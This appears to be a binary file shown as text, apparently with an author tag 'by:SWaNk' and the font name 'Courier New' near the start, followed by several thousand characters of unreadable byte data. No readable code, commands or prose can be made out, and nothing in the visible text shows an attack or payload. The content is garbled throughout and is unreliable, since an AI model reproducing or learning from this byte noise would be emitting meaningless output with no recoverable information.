   ! by:SWaNk! !    �                 Courier New      -                                                                                                                                                                                                                                                                                                                                                                                                    m���3�N��L4W��.c��.[>�����������uzzSs��FL�8�Ot��Ip��l��]\d� �ZW`z�}�>�u��}��޷�_%\��liz}���iJ[���7�aj��Eд�2�*4$o�%�r6/��s�����W�o��}�?�J� M���`��W@����6j��'�:@�@��z���"7�L�CH��nuH��	Bd�����fO��W-�߭T�{vMoY�*�>�)����J�g�ה+Ѽ��J�ғO�����O�K@o����Y��W�ys�a�s�8
b�~g8;��m�*e��3n���;3ulm	u�h�zS��m�\�Ns�u ��W5������������J��}��:���C/�\B�}�S��c�Ą�D7�#�S�Es�$#�T��e�*�T�.�`3�qI�l�K�Q,�CL;�S�Ij�bt�K��l-�L:�a�-R���x0�^>�ށ�gԁ�ƈD}�X,�r�o6��Fj><�f.���q~�	��rM��å���|����M�;�Γnu:coL���ug@-8�d"
u:�p\w-U��Xs�jh����8�:��ލ\���R�g����OY�q]�cs����Gϯ�ͻ�H�7��	���W�M�i�ٜ=���iǭ�<������00��|� $O�
���c@�%	}�Ә}�B!�	ӱ��(ՃޏW!��ȶ�zDq=��IP2�j7,�a/0^$�%uR�6hH�#�ڪ��<��:N~��`pC���p1MtN��'�z)��/א�]�_I���<��޿�)��X��WP*o��Y��-���~��(`�㉴���ٝOln��7�/NTK�e�l��"��@��@�0 U�rx�g��Vu�G��B�J�Ⱥ��N#�K<�|ܚ�N�ߎ��C�֛t� �ݔ�7�=^i0Z]|�yVr�h	y`�P1����;,����0��)63�e�������
��@�JF9D����8�:���u)�ޣXmU]'^�̽��mn~��~���*A����N��5�!$���S��<)2U`| D��v>.٤j�;I�M��Z�.3�J�@\ �u�K���.�����U���+�X�Є)���h�*.�ͱG��l�
u��~��rB4Ϫ��g"�K�%'M��^�����]G��#�����dN���{�|s�q2r*�`ǝ2a���t�|�23�J�?�#�I֞?���$�2�:�-���r��6#�x��x�G�B��v�f���HW�����6�������U�;c�0�A���}8��1*T�Z;�RC�aku�������`�rǑ&��49e]	�������{�f�Fzi�Xe�����f��0��҇��flɄ&o�Y�]�u1(���e_x��O��T35M��U���54����kW��r�l ��4iZD46#��G% �/a ªWK������^?o�w�M ��Hh��v��&8y9���KO���Љ-�C�5���M��	:�\\����j~�{ED�w�Dr&�Él��:�g>��,rm�n4���L��d'ݴ��ۙ���݁q�yOϚC�	��%l�Y��:H尉}(��y�M2�'�S�X^��t�h��
h�}�[��Wc�E�V�Pr��Z�
���ϊ��h�ލ�p����E?�5�&>�lf}�6�{�yԧ��ǡUK���줯:0��T:��rC`qЈ]^�\�~ש�2���Ɠ����&ckG��x'Sٔ���*�����7D_��!��u@�2d�,J�R2�l=�[I�:a�;I�n��v3��y��;H�ʍc<�p�+��}�)����3�@�éA�*��T�?��S�@	��sM�/��"��Κl��2��+���%�x�\�a�-���qt��g������Q��0T�$���N1�d+^���,�_��i2|��[s93�l?k0zG������8S��՗-��F"�=��cM�����<��c��ä�FêS���U@c�%�xS�����_���ɿ;,�J��0�Gt� ��Dgo��ש�:��� �7[���8NN�������Y�<�B���s�c
U�jg�#��y�۫��;�{��������y館���:rc]�t����Uu*��O�Sw���'�P�;����9���La�d�v��k�2'LG��~���]O�h�d��n'���K���g��<fil��à+�9�4��p�����B�"����B+s�u���Y��n�n�|��ɺ����:4�Ɩ73���?d=g#]��:����<4�m\��~>]���������� T���>\Y8����T�ȂLG��d�t\Ø�L*Rmݏ߽u?S��nk���f�|oziW��K60��{�g�[�{LkDU�C�:p���=вg/�$� 01wbP  ���, B��&B`�]$C�L#ED�p�~$h�ma*��](
S$IJIAрx�B�O��)7H��D�v�wᓻ�ᮻ�v �an�ӪN+|�gWM�����:�=5/������4��N�{�����hΤ�\'#  ���� �p��(lN�%�ɃS�%�Ҭ�.�]�5��:��Nj��OC[�:���'L���8s���d����em>��Ī�1����(�+��fԏ,�mS�+%y�A�t�S�.4�b�R��iғ�0LDH-W�U�|a�F�χ�|'�[���槔���O�޲�ק��w�t�|��R~HJ�� {5� H01wb�  �����B�i�R]�j�%#K�aIFQ�y!��}( q\2̮iƑ�4}%[�0�C��W@�bͩq3�g�(J��1>��5Ȫ����ѽ��0ˈ����6ӟ��=�/ԧ���1� �g�]&7�����7%�n\ 1��M�3j ��5ާ#�c�)P�'�|��u�goa��XH�!%����,��l"%��,�8{�1@ة�֮��dze
�����t�
�#  !%��� $�[r���7���m=2�;�<�CӦ�1�,ۺ����f2���vs3q����T��v���h �Eu���=v"_�:�;���2�$ �RJ�O���U��,�V�#I�]f�4�w�̂����29��E�F���B>La��q�A|�C,���>u�tJ(���B�#;�kq��5��6���J ��PLtK,'�U����Z�p���J�}P:�����$rq��@HJ�Fq2ޓ-^����Ӆj�00dc    �S�Cu}���o'��䈴��s�cV��Ww��S�������v�}�+סY䙣����[�@�lm4��j��+�A���������CCY�-�S�ʅ"V"Z+Mi���Á�Y;0�0�g0C>�^�,F����*2wI�cL8��#�#� r�����}b�H��62����,Z}���ذQ @C��x �yW��JQ��i����4���3)5�%,1

̼e��k�5�"y����#�X���g��W�ʸdL�u��d��������{	����2DK��"W�9W��������O���_���T�x��_	~�hK�}W��v��=x�W��Bt
b@�6Na�������^(�C@��wǶV�����~�|���'���/�:J�*;�V��P��t߆�M�Ρg�����҉��u�yH�t���B���w��'g�7���o!B����w�f������ �F���]�tڮ�H�4D]�i����M�Y��7kajvv���UR�n����0%�{�걛�S�_��B��S���~
m��թ�������_�ws�	�+��8Ha z�x�I�w%�5ud�(�\��%����C�����=�(�Z|N�`�����B�X�iћ������6K�03W�B�dc7�����W��(�ě�N��;N^r}����hVP,�M��;�b
7D�j65�-g@��T !�D%7$Z�-ۃ:�L�&8�)���?9�!�K힙�q����A��y����%>�N�w���{���]P��_e�#JN����!9���8
9�%m�!��8d�T���;���> [d÷
�pX�R��K}j�./V�����XI) ��	 �c�%GՈ䂅J���r����2�~�IEwN�L'�Ax ���ŀ�x��E�R��Zo�(xI��.2�ʕ{�Xi@fy9��~?T</P�kH��U	�����VO��?�uʺ���.x�d�A'�Y?*�Q%��e	<<����ꛋ��nw{�yu��eJl-
y;�����q�3��z�����+RfT�J(i�ω�ng<��e|�g�:�i������Nf0�}���s�i:=ޭ�ƚ��wS�BBW~����L�Ag��o`����C�cG�
4�
܋�^sIRE�D%��\�1�e@��Ƶ`��jǭ�j��(�.q�������&�Pa,JwI�����@ �`x���	�X����SS9Z�WG����x.���QL�<gi!ڣT�:��k`��4O%�7*��9|�K�݀�xb+��i�r#N���ܐ|?�-m���6�!w�}��P��g�ַ7����8�t�Z�=!�����%?U����{�Ҟ
�#���v��2�IA�-�(�|���O���&�\�zE�Fn� �t,��K�ۚy��A/�U�) ������}��\>�1�rw��1�fRq�#!���^��{��I[p���D�]�|ߨ�l����;������%Uj�g�:HdK�p��ķ����d�x���M+/�جx���.���<w�O=�f�ӑf�g-֊V=�Q�~�I�U���p ƶ4������dY�ew��g�%9ô�<��:/zE��u+�/��i�K)�~��ƛ#Fގ�C���oVm�q	�Y�ځܚt{�h��T���i���O��;X��ͅ<��ǯ���c_�{O
OgOP=�U�A��ψ�yS�6il�)��� <�F� ,K/mJ� ��$��U1n�`��<T��Ѡ���;������6y R�wb������`Su��Y�&{2�N|5H�!#�F������R�CqQ�g9�j�����8�3����W㝾�-֓P���[�^h�a��'<L���8���'�Q��O�i�w�إGmƜ;�
0��,O�e�LB���'�Ï�N��w���[=���߼�ڠ(���l{<��8�PB�?�����+?��x���C�7�K�Va����&u[�i"M\��%�.�����~����Yd�̅=~6P*��,b�@��L�u;����
w���ٮ
;�?�0�I�@���6Ն��oG[v�1R����A��޲�"�-8L2�2��F:*�T��'m,C+������'�`�OzN��t~J�F�}|��B�0sN�O���ʉn�&mD��xˇ&c	��d^�!��y�����{�K]��%�����]�s��4DM<RwcM�8�4s���i�2����V���) �����.����ˇ�>y����Ia�0ˇ��L��@��жJ�10R�q���&J�Z��`�h��"Ԓ������m��[�Ь�#�l���r-��z4{EL�@�Qj;����.9t���.�����bxDy>�#��.nۣTYד��"-�^DŠ�Ǔ�7��L���<�}�#Dv�:��w�ӈ�|D�x2�8��] ��:>� xK���! h!(Ϙ�f�r�:��8���^mt.q�/ml�����(�D!E�!$H��Z���bL���]
��bɔXhV%�"�d��bE��I
ޟI��j��5�YN*KzD�k�nI���^��
�$�<����ϓ��� ��	���i�8e�M���Ќ[��=��Ny���dTFS�T��]�c�{��L|�φ��X@P?��"@�]D�UR��l���N)4w�0)��;��6���z�p-�v�SH{�J$���y��?���E�	X��_��)`�[d9�N�j[�$���`�ߤ�����k��l����
~�E�R�>�}��7u�[�'5�g�@r�H���� �U��ʼ��4����?�*|���ȏ��O`�s��.����l)�t�y(���&I��U7�y��c%Giarj���J�8��}������̞O��f,}(Pu�����90S�O����>�F8����fۀ��ԇU��gN�6�sЙ��">z��sG���,5���P�G��_��
n�G���������۴�^�]��B�9���	�4�љ����=�	�I�S+b�X��+y��kNO(Ӵ���ƾ�T��h�t3��}D_`�ކ^{���P�V}/�=  �֏K�=�:�n�Jի���Xn��+��46����q�<��)�dHV��[E�f%�&Wݣ=��o2�Lx����Lgt�F�� �k����$�IN����6���+.Rp<���?���<�����0�yU��EF<6Φk��?�9�y9�pX�'R�BK������񵼄	yyq�n}��rӪ� �w9?AW�<#��I��x�_EƑ�ː|�FΝr��r0|��WΟo�3Ǵ>����1�`��|�i�'�gXV�!\���C�Oh�!���a Wo&W�M�����P����L�O�S��Rx_���Az��R<��x��gy2��JpV�}�sy���Z�v���E=���"��#l*8��6�]׍N���a��}2r��0'9c	�u] �;���DY!�	x�������I��c�
���ϓ�D�Dt�q��嬝k
n9�^�5k ������SC#�EM푌�j�m$��3j玟:�������8rP���Q�Đ�t����eO6��|��B��=݌(c�G���y�,�8���<�o����^�:������Ws�����O9l��4L�hr��Lu�!V|�C�*���������mj����H��3���<��w�[�!d�����\mF$�	.I��l>:L0��І�N��"��U�%Z:��6V���B	���~�:8q�'_\�Ai� 01wb�  ���" ]R��a�z$�)�aID�nɜ�'��1,�vc%���*��̪�]��~�wfP�:9\��:A�	�☰4A1�Rw%�	b�]B"��}��D�cL���ygY3W7z�Is!P������.f˩���?(H8\�i�)Sᖮ�<C���8ָ$�H)˴ ŊTD�ȖY�,�G�?�c!��MC�A��'�1�U��R��Dz��),��:N[����
���n��Fdx�tR������X�3l�W����b����!����z
��3�hR���U��/Q�e֒���zd���5]�àdU�#F��W�X#�6���?T�v��e��7���V?��Ri^��|WJ��������ZYf��G-���P֤&LoZ00dc�    �T`S����F���u{��޽����7��w������w���c"kF��e_t�$`��Vǉ��z��i^�W���[ ��>��I�H ���[���e����ν�G��!��xK΄i.:�,\4zuoMN6�["�������E����st�ڝ�Ru�II��	a
��JV��8��a�'�N��+x�Ӈ�G�3G�;�o'&G���CrLrϾ1cVь��O=���nv��GPǫ'��ֳ�.�Ӷ���Ǽ���=�̸�M�E�]� %�����O�FS��.o�^�e�Z���dh�ǹ���l�qEۆO��p�@+W���2�����!	 جz�K���3��/W����O�VNK�1��n'�;h�4w��b�����>��s�"�X�<�$�`�]���aQ��h��}�y�/�3�ǹ��[������Sf��}��uH���� ��l��T�!|<�|G�Ð�������](e�ۇ=N��Eʬ�����Τ���
+�6�b�j��J
��\%�lYP�g��	@â���?jp0@��ip �*	Vc_q�j�꼔D�禜��h���'O��i �H19��������[�W��# G���h�*4{�uF����m�d<����&=:um���g��
p�u�>D!�u0��_ӵ�e������گ������H��;>���À��� `eK��W��l&V�R�"���% ���J<�[�B�
O����*�܄�%g0f�Q̎\f�s�s�8{!v�i�"�a�F��G*�U�׭����;�����SDhm�3j������ouy �2�0�+��ߎV��#��&���g�1��I��ת�zq�Y(�(�L(�m��%�������>/P>`8�F��o�`���D�����������0�2�+��d�E���?���Q�Zu�����ά�O7���|d6��y���I��E|����Zr+� �G�Ð��}��BJ�+���Ą`������G���S��������cVw�-�'�,���컺�!�x�֫�JI^�W#������~iL��Ts0Ңw�{��i]�ת��Jӡ�Js�3����V�+�2���q��#�v�����$����G�C�@<�>W?��j����y�0L�D{����t׏�߃�i������oL���g�'